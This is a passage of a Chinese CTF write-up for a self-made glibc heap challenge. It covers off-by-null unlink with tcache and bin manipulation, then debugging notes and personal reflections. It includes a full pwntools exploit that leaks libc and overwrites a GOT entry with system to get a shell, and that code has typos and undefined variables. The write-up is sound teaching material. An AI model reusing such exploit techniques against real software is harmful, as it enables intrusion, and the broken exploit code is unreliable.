<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-number">24</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-number">25</span>)</span></span><br>#将chunk24，<span class="hljs-number">25</span>free到fastbin<br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x400,b<span class="hljs-string">&#x27;aa&#x27;</span>)</span></span>#<span class="hljs-number">28</span>，smallbin<br>#申请chunk28后fastbin里的两个chunk被放入small bin。这里的相关机制可以来看看extra。<br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x28,p64(fake_chunk_addr)</span></span>)#<span class="hljs-number">24</span>，再次申请，堆上遗留了bk指针，可以直接覆盖为目标地址<br></code></pre></td></tr></table></figure>

<p>这样一来我们成功使得fd位指向fake chunk，并绕过了<code>FD-&gt;bk = p</code>   </p>
<p>然后是<code>bk_nextsize = p</code>的绕过：</p>
<p>因为<code>bk_nextsize</code>本身指向chunkA，我们还是需要伪造它使得<code>bk_nextsize</code>指向chunkA + 0x10。</p>
<p>对于这个检测我们依旧要利用到别的chunk的帮助</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;tcache&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(<span class="hljs-number">28</span> + i)<span class="hljs-comment">#填充tcache</span><br>    <br>add(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;a&#x27;</span>)*<span class="hljs-comment">#23,Tcache</span><br><br>free(<span class="hljs-number">20</span>)<br>free(<span class="hljs-number">23</span>) <br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br> add(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">0x28</span>, p64(fake_chunk_addr))<br></code></pre></td></tr></table></figure>

<p>然后进行unlink。</p>
<p>unlink的触发实际上只需要用off by null向下一个chunk溢出空字节，再free被溢出的chunk就行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>edit(<span class="hljs-number">28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0x520</span>))<br>delete(<span class="hljs-number">28</span>)<br></code></pre></td></tr></table></figure>



<p>整个过程的示意图如下：其中chunk ptr指large bin残留的指针。</p>
<p><img src="https://img-blog.csdnimg.cn/20210715135730274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = precess(<span class="hljs-string">&#x27;./summer2&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.29.so&#x27;</span>)<br>unlink_addr = <span class="hljs-number">0x6024b0</span><br>free_got_addr = <span class="hljs-number">0x4036E8</span><br>next_chunk_addr = unlink_addr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>	r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>	r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>	r.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>	r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	r.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>	r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	r.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>	r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>	r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(content))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span>():</span><br>	gdb.attach(r)<br>	pause()<br><br><br><span class="hljs-comment">#----------------Tcache-------------------</span><br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;fill&#x27;</span>)<br>    delete(a)<br><br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>	add(<span class="hljs-number">0x1020</span>,<span class="hljs-string">b&#x27;fill&#x27;</span>)<br>	delete(b)<br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>	add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;fill&#x27;</span>)<br>	delete(c)<br><span class="hljs-comment">#-----------chunk constrution--------------</span><br><br>add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;largebin chnuk0&#x27;</span>)<span class="hljs-comment">#chunk21</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;top&#x27;</span>)<span class="hljs-comment">#chunk22</span><br>delete(<span class="hljs-number">21</span>)<br>add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;functional gadgets&#x27;</span>)<span class="hljs-comment">#chunk23,to push the chunk21 to largebin</span><br><br><span class="hljs-comment">#-------fake chunk construction------------</span><br><br>add(<span class="hljs-number">0x28</span>,p64(<span class="hljs-number">0x530</span>) + p64(chunkC_addr))<span class="hljs-comment">#fake chunk </span><br><br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#24</span><br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#25</span><br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#26</span><br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#27</span><br>add(<span class="hljs-number">0x600</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#28,off by null</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;tcache&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(<span class="hljs-number">23</span> + i)<span class="hljs-comment">#填充tcache</span><br><br><span class="hljs-comment">#-------FD-&gt;bk = p-------------------------</span><br>delete(<span class="hljs-number">24</span>)<br>delete(<span class="hljs-number">25</span>)<br><span class="hljs-comment">#将chunk24，25free到fastbin</span><br>add(<span class="hljs-number">0x400</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>)<span class="hljs-comment">#28，smallbin</span><br><span class="hljs-comment">#申请chunk28后fastbin里的两个chunk被放入small bin。</span><br>add(<span class="hljs-number">0x28</span>,p64(fake_chunk_addr))<span class="hljs-comment">#24，再次申请，堆上遗留了bk指针，可以直接覆盖为目标地址</span><br><span class="hljs-comment">#-------BK-&gt;fd = p-------------------------</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;tcache&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(<span class="hljs-number">28</span> + i)<span class="hljs-comment">#填充tcache</span><br>    <br>add(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;a&#x27;</span>)*<span class="hljs-comment">#23,Tcache</span><br><br>free(<span class="hljs-number">20</span>)<br>free(<span class="hljs-number">23</span>) <br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br> add(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">0x28</span>, p64(fake_chunk_addr))<br><br><br><span class="hljs-comment">#-------unlink-----------------------------</span><br><br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>edit(<span class="hljs-number">28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0x520</span>))<br>delete(<span class="hljs-number">28</span>)<br><br><span class="hljs-comment">#-------leak-------------------------------</span><br>show(<span class="hljs-number">21</span>)<br>free_addr = u64(r.recvuntil(<span class="hljs-string">&quot;DOWNLOAD SUCCESFULLY&quot;</span>)[:-<span class="hljs-number">5</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>))<br>libc_base = free_addr - libc.symbols[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>edit(<span class="hljs-number">1</span>, p64(system_addr))<br>show(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br><br><br>r.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4)总结"></a>4)总结</h2><p>不管是level0还是level1、level2，其实都是off by one庞大利用方式中比较基础的点。</p>
<p>level2的思路很有趣。</p>
<p>不管怎样万变不离其中，off by one/null可以导致一个字节的的溢出以修改chunk header，从而触发各种各样的漏洞利用。</p>
<h2 id="5）军训？考核？大冒险！"><a href="#5）军训？考核？大冒险！" class="headerlink" title="5）军训？考核？大冒险！"></a>5）军训？考核？大冒险！</h2><p>原本是计划三道题。一道full relro的ret2dl，一道多线程或者xtea加密的re，一道简单off by one（就是summer）。</p>
<p>在军训一天后觉得出三道题，这确实是不可能的事。累倒不累，主要是时间都是碎片化的不好利用。</p>
<p>当时考核发布的时候我们都觉得时间是充足的，能先花时间学考点而不是研究怎么做考核。实际上考核一公布我就写了summer的大概框架，之前没有怎么从源码层面上阅读堆题，甚至那个时候也是刚刚接触堆半个月，所以写得很艰难，大概花了一周的时间把程序完善。后来发现了一个很严重的非预期，觉得自己有点急于求成，对堆一知半解的就想出堆题是不是有点不识好歹了，就暂时放下了考核而开始研究堆题的考点。这期间我也一直认为军训完还有充足的时间来完善题目。</p>
<p>再后来三道题变成了一道题。</p>
<p>很遗憾没有在考核期间完成full relro的ret2dl。。不过有没有作为考核完成也不是特别重要了，我已经部分翻译了原文相关的部分，打算暑假认真调试一下。。。</p>
<p>大概七号的时候就完成了level0和1，本来最初计划就是这两个level的，但是不知道为什么想不开加了level2，学得很艰难。并且</p>
<p>感觉写的支离破碎的，说白了我的知识面不足以支撑我完全理解这个检测的绕过方法，所以一些东西写得十分离奇。比如通篇几乎没有用到edit功能，因为参考的wp的原题都是没有这个功能的。</p>
<p>很让我恼火的就是我对于largebin、smallbin还有Tcache的机制不甚熟悉，而解题中涉及到的堆指针覆写的很多姿势实际上都是基于这些bin特有的机制。</p>
<p>说实话有点惭愧，大一上我干了啥呢。啥也没干。</p>
<p>硬着头皮看🐟最早分享的长亭二进制入门课，那时我愿称之为天书。</p>
<p>做签到栈溢出，复制别人的exp打，搞半天都连接失败，死也打不通。</p>
<p>就跟忘记了当初为什么要学习二进制一样，我也忘记了当时为什么我要每天晚上看那个nep的直播课，忘记做考核的那种不做出来就跳楼的决心来自哪里。</p>
<p>相似地，我还忘记了我为什么要学pwn，而不是我比较憧憬的游戏安全。</p>
<p>就好像一件事情的发生通常拥有直接原因和根本原因，而我的一系列行径是没有直接原因的，并没有什么很直接的驱动力或者很特别的理由。</p>
<p>这是一件非常奇怪的事情。通常来说我是一个比较有明确目标的人，但是在这种关键的事情上我的选择却不是由我本人决断的。</p>
<p>这果然是一件非常奇怪的事情，硬要类比，可以来一句经典名言：” 爱也如此。”</p>
<h2 id="6）extra（慎重观看）"><a href="#6）extra（慎重观看）" class="headerlink" title="6）extra（慎重观看）"></a>6）extra（慎重观看）</h2><p>extra部分。</p>
<p>多为调试时遇到的环境问题或者一些懂的都懂不必多说的基础知识。</p>
<p>但是怕被说水考核就加上了。</p>
<p><strong>pps：平时文档写多了总有一种奇怪的引导的语气。。。要多具体有多具体的那种，所以废话以及不必要的操作巨多，慎重观看。</strong></p>
<p><strong>ppps：只要我的解题的思路的正文部分足够简略清爽，就不会有人说我拖泥带水（）</strong></p>
<h2 id="调试部分"><a href="#调试部分" class="headerlink" title="调试部分"></a>调试部分</h2><h3 id="1-1-解决gdb无法查看heap等信息的问题"><a href="#1-1-解决gdb无法查看heap等信息的问题" class="headerlink" title="1.1-解决gdb无法查看heap等信息的问题"></a>1.1-解决gdb无法查看heap等信息的问题</h3><p>指定libc加载后进行调试。发现gdb无法显示当前的堆块以及链表信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hea<br>heap: This <span class="hljs-built_in">command</span> only works with libc debug symbols.<br>They can probably be installed via the package manager of your choice.<br>See also: https://sourceware.org/gdb/onlinedocs/gdb/Separate-Debug-Files.html<br><br>E.g. on Ubuntu/Debian you might need to <span class="hljs-keyword">do</span> the following steps (<span class="hljs-keyword">for</span> 64-bit and 32-bit binaries):<br>sudo apt-get install libc6-dbg<br>sudo dpkg --add-architecture i386<br>sudo apt-get install libc-dbg:i386<br></code></pre></td></tr></table></figure>

<h5 id="1）通过pwntools加载带有dbg符号的libc"><a href="#1）通过pwntools加载带有dbg符号的libc" class="headerlink" title="1）通过pwntools加载带有dbg符号的libc"></a>1）通过pwntools加载带有dbg符号的libc</h5><p>加载带有<code>degub_symbols</code>的libc，一般来说是手动添加或者加载带有调试符号的libc，glibc官方文档对此进行了说明。</p>
<p>后者可以从清华镜像站下载。</p>
<p>这里花了一些时间重新了解了一写glibc链接库的一些知识。</p>
<p>更改后的脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">r = process([<span class="hljs-string">&quot;./glibc/debug_symbols/lib01/usr/lib/debug/lib/x86_64-linux-gnu/ld-2.23.so&quot;</span>, <span class="hljs-string">&quot;./summer_1&quot;</span>],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./glibc/debug_symbols/lib01/usr/lib/debug/lib/x86_64-linux-gnu/libc.so.6&quot;</span>&#125;)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./glibc/debug_symbols/lib01/usr/lib/debug/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)<br>elf  = ELF(<span class="hljs-string">&#x27;./summer_1&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>执行失败。报错是 <code>doesn&#39;t have any GOT symbols, skipping PLT</code></p>
<p>暂未找到解决方案。</p>
<h5 id="2）手动查看堆内存信息"><a href="#2）手动查看堆内存信息" class="headerlink" title="2）手动查看堆内存信息"></a>2）手动查看堆内存信息</h5><p>根据内存分布找到堆上数据的地址，然后通过<code>x/gx</code>命令手动查看。</p>
<p>那么如何找到堆数据具体的内存地址？</p>
<p>打开一个简单的堆题来参考。</p>
<p><img src="https://img-blog.csdnimg.cn/20210715135759930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>可以看到heap头地址在B008，比bss_end足足高了FA5。</p>
<p>所以并没有找到什么联系捏。。。</p>
<h5 id="3）手动编译degub版本的libc"><a href="#3）手动编译degub版本的libc" class="headerlink" title="3）手动编译degub版本的libc"></a>3）手动编译degub版本的libc</h5><p>下载相应的glibc源码并编译。</p>
<p>编译时需要开启debug</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">mkdir build &amp;&amp; <span class="hljs-keyword">cd</span> biuld<br><span class="hljs-string">../configure</span> <span class="hljs-params">--prefix</span> = <span class="hljs-string">/usr/local/glibc-2.29</span> <span class="hljs-params">--enable-debug</span> = yes<br>make -j4 &amp;&amp; sudo make install<br><span class="hljs-comment">#64 bit</span><br></code></pre></td></tr></table></figure>

<p>编译完成后可以通过链接该库直接编译程序源代码。</p>
<p>如果需要用该版本链接库执行已编译的程序的话可以替换二进制文件解释器路径，但是必须修改程序二进制文件的程序头，将我们需要的ld路径写入。ld路径与libc中的ld路径必须匹配，否则会出错，导致系统指令无法执行。</p>
<p>然后更改LD_PRELOAD环境变量</p>
<h3 id="1-2-解决libc-so-6相关报错问题"><a href="#1-2-解决libc-so-6相关报错问题" class="headerlink" title="1.2-解决libc.so.6相关报错问题"></a>1.2-解决libc.so.6相关报错问题</h3><p>上述脚本执行后，python3报错，原因大致是没有<code>libc.so.6</code>文件。</p>
<p>查看对应文件夹发现情况属实。</p>
<p>解决方案是手动创建对应的<code>lib.so.6</code>文件。</p>
<h3 id="1-3-附加调试后的地址随机化问题。"><a href="#1-3-附加调试后的地址随机化问题。" class="headerlink" title="1.3-附加调试后的地址随机化问题。"></a>1.3-附加调试后的地址随机化问题。</h3><p>一个很奇怪的问题，环境是ubuntu18.04，libc默认2.27.</p>
<p>gdb直接调试程序，内存地址是固定的，但是一旦利用脚本进行附加调试就会出现地址随机化。</p>
<p>附加调试下的heap</p>
<p><img src="https://img-blog.csdnimg.cn/20210715135831417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>直接调试下的heap</p>
<p><img src="https://img-blog.csdnimg.cn/20210715135852934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我怀疑是gdb的配置出了点什么毛病，这个ubuntu18环境是我之前随便装的，没怎么管。</p>
<p>解决方案：</p>
<p>1：暂无</p>
<p>2 : 无视问题，摁调。</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="2-1-Tcache的安全问题"><a href="#2-1-Tcache的安全问题" class="headerlink" title="2.1-Tcache的安全问题"></a>2.1-Tcache的安全问题</h3><p>2.27版本下相对于2.23新增了tcache机制。</p>
<p>Tcache为每一个线程创建缓存，即内含一些堆块，每个线程分配64个bins，一个bins最多存7个chunk，64位下chunk的大小以16字节递增，也就是最大1032b，所以Tcache并不能存放large bin。，</p>
<p>释放堆块时，如果chunk大小符合要求就放入Tcache，直到Tcache被填满，这个操作是优先于fastbin或者其他操作的。</p>
<p>分配堆块时，如果从fastbin返回了一个合适的chunk，那么fastbin中的其他chunk都会被放入Tcache（除非被装满），smallbin同理。</p>
<p>以及，分配堆块时，如果Tcache中有合适的chunk，就从其中取出来，这也是优先于其他bin的。</p>
<p>可以看出Tcache的优先级比较高，这就导致很多有效的检测将被跳过，在提升执行效率的同时也大大提升了安全风险。</p>
<p>虽然但是，本题的2.27版本不涉及Tcache的安全漏洞利用。只需要将tcache填满就行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>)<br>    add(<span class="hljs-number">248</span>,<span class="hljs-string">b&#x27;fill&#x27;</span>)<br>    free（i）<br></code></pre></td></tr></table></figure>

<p>Ps:每个size的Tcache最多有7个，也就是连续申请7个0xf8的chunk再释放就能把tcache填满。</p>
<h3 id="2-2-chunk的size的内存对齐问题"><a href="#2-2-chunk的size的内存对齐问题" class="headerlink" title="2.2-chunk的size的内存对齐问题"></a>2.2-chunk的size的内存对齐问题</h3><p>题目中我们申请了四个size为0xF8的chunk 申请后的heap信息如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">Allocated chunk | PREV_INUSE<span class="hljs-comment">#截取了chunk0的信息，地址问题承接上文。</span><br>Addr: 0x1b39250<br>Size: 0x21<br><br>Allocated chunk | PREV_INUSE<br>Addr: 0x1b39270<br>Size: 0x101<br>----------------------------------------------------------------<br>pwndbg&gt; x/50gx 0x1b39250<br>0x1b39250:	0x0000000000000000	0x0000000000000021<br>0x1b39260:	0x0000000001b39280	0x0000000000000000<br>0x1b39270:	0x0000000000000000	0x0000000000000101<br>0x1b39280:	0x0000000a61616161	0x0000000000000000<br>0x1b39290:	0x0000000000000000	0x0000000000000000<br></code></pre></td></tr></table></figure>

<p>可以看到没有什么太大的差错。</p>
<p>然而针对实际情况，我们提出两个问题。</p>
<p>1）为什么0xf8实际是0x101？</p>
<p>0xF8 + 0x8 = 0x100（ps：101中的最低位的1是prev inuse位）</p>
<p>也就是实际比我们申请的多了八个字节。</p>
<p>那么是不是我们申请的每个堆块的实际大小都会比原来多0x8呢？</p>
<p>具体来试一试。这次我们申请0xf0大小的chunk。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">Allocated chunk | PREV_INUSE<br>Addr: 0x908270<br>Size: 0x101<span class="hljs-comment">#chunk的size还是0x101，相当于这次增加了0x16</span><br></code></pre></td></tr></table></figure>

<p>注意到两个值一个16字节对齐，另一个是16的倍数再加了八字节。</p>
<p>事实上就是malloc的对齐机制。机制比较完善的编译器会为我们malloc的chunksize自动对进行内存对齐。比如说malloc 0x15的chunk，内存中就是0x21。0x21的来源就是malloc自动为0x15进行内存对齐。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">0x12a5270:	0x0000000000000000	0x0000000000000021<br>0x12a5280:	0x0000000a61616161	0x0000000000000000<br></code></pre></td></tr></table></figure>

<p>回到问题本身，那为什么我们要专门申请16+8的size呢？</p>
<p>众所周知，ptmalloc中有一个神奇的节约内存空间的内存复用机制：</p>
<p>众众所周知，malloc规定，只有当本chunk的前一个chunk为free状态的时候，本chunk的prev size才是有意义的，如果本chunk的前一个chunk处于allocated状态，那么即不使用本chunk的prev size。</p>
<p>基于这种规定，当处于alocated状态的prev chunk越来越多，势必会造成一些浪费，所以malloc又规定，如果本chunk申请时size大小是16的倍数，那么就在它前面增加prev size位和size位，如果是16x+8的形式，那么只在chunk前增加size位，prev size位则储存在prev chunk的最后八位。也就是我们一开始碰见的情况。</p>
<p>因此我们要对chunk进行off by null，那么它的prev size位肯定是要可控制的，所以这里我们就需要申请16+8，将prev size分配到上一个chunk中供我们篡改。</p>
<p>2）chunk的size大小问题，有很多size供我们选择，为什么偏偏要是0xf8？</p>
<p>解决了第一个问题，第二个问题其实很好解释。首先前文说到的，要空字节溢出，size就不能太小。其次size是16的倍数+8。满足了这两个条件只要不是大得离谱（别跑去large bin或者mmap了），随便啥size都可以，但是太大也不好掌控还浪费空间。</p>
<h3 id="2-3-unlink？"><a href="#2-3-unlink？" class="headerlink" title="2.3-unlink？"></a>2.3-unlink？</h3><p>不管是2.23还是2.27，unlink最终目标都是通过堆叠来修改chunk指针的内容。</p>
<p>那为什么是unlink，而不是其他方法？</p>
<p>首先来回顾一下unlink的利用过程。</p>
<p>在有检测的情况下，绕过检测是利用unlink的较为关键的一步。</p>
<p>检测使得我们不能直接修改next chunk 的fd 和bk后进行unlink。绕过的方式也有。fd和bk只要满足以下条件，则会触发target chunk的unlink。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">fakeFD -&gt; bk == P` ，等价于 `*(fakeFD + <span class="hljs-number">12</span>) == P<br>fakeBK -&gt; fd == P`` ，等价于`*(fakeBK + <span class="hljs-number">8</span>) == P<br></code></pre></td></tr></table></figure>

<!--0x12和0x8的来源参考chunk的结构。-->

<p>触发后，操作如下</p>
<ul>
<li><p><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></p>
</li>
<li><p><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></p>
<p>如果<code>*(fakeFD + 12)</code>=<code>*(fakeBK + 8)</code>=<code>*P</code></p>
<p>那么也就是</p>
<p><code>*P = P - 12</code></p>
</li>
</ul>
<p>这样p的地址就向下偏移了0x12个字节。</p>
<p>设置<code>*(fakeFD + 12)</code>=<code>*(fakeBK + 8)</code>=<code>*P</code>的方法也很简单，只需要<code>fake_fd = nextchunkptr - 0x12，fake_ bk = nextchunk -0x8</code>就行。</p>
<p>虽然这样大费周章也只是让p地址下移了12，但是这0x12字节足够我们构造堆叠了。</p>
<p>ps：可以类比数学证明题来理解这段绕过的分析思路。从使检测成立的结果一步步逆推，这里使用的就是”根据结果推原因”，属于“分析法”</p>
<h3 id="2-4-largebin"><a href="#2-4-largebin" class="headerlink" title="2.4-largebin"></a>2.4-largebin</h3><p><del>其实了解large bin或者largebin attack前还需要了解unsortedbin，但是unsortedbin感觉不是重点。</del></p>
<p>稍微介绍本题中关于largebin chunk的一些比较关键的数据构。</p>
<p>为了加快检索速度，largebin链表增加了fd_nextsize,bk_nextsize指针，用于指向第一个与自己大小不同的chunk（所以只有当largebin中有两个大小不同的chunk时，这两个指针才会被修改)。如果 large bin 中仅有一个 chunk，那么该 chunk 的两个 nextsize 指针都会指向自己。</p>
<p>largebin中的chunk大致结构如下</p>
<p><img src="https://img-blog.csdnimg.cn/20210715135936538.png" alt="在这里插入图片描述"></p>
]]></content>
      <tags>
        <tag>mess</tag>
      </tags>
  </entry>
</search>
